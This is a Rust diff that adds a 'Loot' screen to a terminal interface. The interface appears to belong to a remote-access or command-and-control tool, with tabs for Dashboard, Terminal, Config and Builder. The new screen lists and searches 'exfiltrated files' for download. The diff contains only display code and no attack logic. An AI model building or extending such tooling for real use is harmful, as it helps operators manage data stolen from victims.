@@ -25,7 +25,8 @@ pub fn draw(f: &mut Frame, app: &AppState) {
         CurrentScreen::Dashboard => render_dashboard(f, app, chunks[1]),
         CurrentScreen::Terminal => render_terminal(f, app, chunks[1]),
         CurrentScreen::Config => render_config(f, app, chunks[1]),
-        CurrentScreen::Builder => render_builder(f, app, chunks[1])
+        CurrentScreen::Builder => render_builder(f, app, chunks[1]),
+        CurrentScreen::Loot => render_loot(f, app, chunks[1]),
     }
 
     render_footer(f, app, chunks[2]);
@@ -40,12 +41,13 @@ pub fn draw(f: &mut Frame, app: &AppState) {
 }
 
 fn render_header(f: &mut Frame, app: &AppState, area: Rect) {
-    let titles = vec![" DASHBOARD ", " TERMINAL ", " CONFIG ", " BUILDER "];
+    let titles = vec![" DASHBOARD ", " TERMINAL ", " CONFIG ", " BUILDER ", " LOOT "];
     let current_index = match app.current_screen {
         CurrentScreen::Dashboard => 0,
         CurrentScreen::Terminal => 1,
         CurrentScreen::Config => 2,
-        CurrentScreen::Builder => 3
+        CurrentScreen::Builder => 3,
+        CurrentScreen::Loot => 4,
     };
 
     let tabs = Tabs::new(titles)
@@ -451,6 +453,35 @@ fn render_builder(f: &mut Frame, app: &AppState, area: Rect) {
         .style(Style::default().fg(status_color)),
         chunks[3]
     );
+}
+
+fn render_loot(f: &mut Frame, app: &AppState, area: Rect) {
+    let chunks = Layout::default()
+        .direction(Direction::Vertical)
+        .constraints([Constraint::Length(3), Constraint::Min(1)])
+        .split(area);
+    
+    let border_color = if app.loot.search_mode { Color::Yellow } else { Color::DarkGray };
+    let title = if app.loot.search_mode { "SEARCH EXFILTRATED DATA (TYPING) " } else { " SEARCH (Press '/' to type) " };
+    let cursor = if app.loot.search_mode { "█" } else { "" };
+
+    let search_input = Paragraph::new(format!("> {}{}", app.loot.search_query, cursor))
+        .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(border_color)).title(title));
+    
+    f.render_widget(search_input, chunks[0]);
+
+    let filtered = app.loot.filtered_files();
+    let items: Vec<ListItem> = filtered.iter().map(|f_name| {
+        ListItem::new(Line::from(Span::raw(f_name)))
+    }).collect();
+
+    let list = List::new(items)
+        .block(Block::default().borders(Borders::ALL).title(" EXFILTRATED FILES (Press [ENTER] to download) "))
+        .highlight_style(Style::default().add_modifier(Modifier::REVERSED).fg(Color::Yellow))
+        .highlight_symbol(">> ");
+
+    let mut state = app.loot.list_state.clone();
+    f.render_stateful_widget(list, chunks[1], &mut state);
 }
 
 fn render_checkbox_list(f: &mut Frame, selected: &BuilderField, items: Vec<(&str, bool, BuilderField)>, area: Rect) {
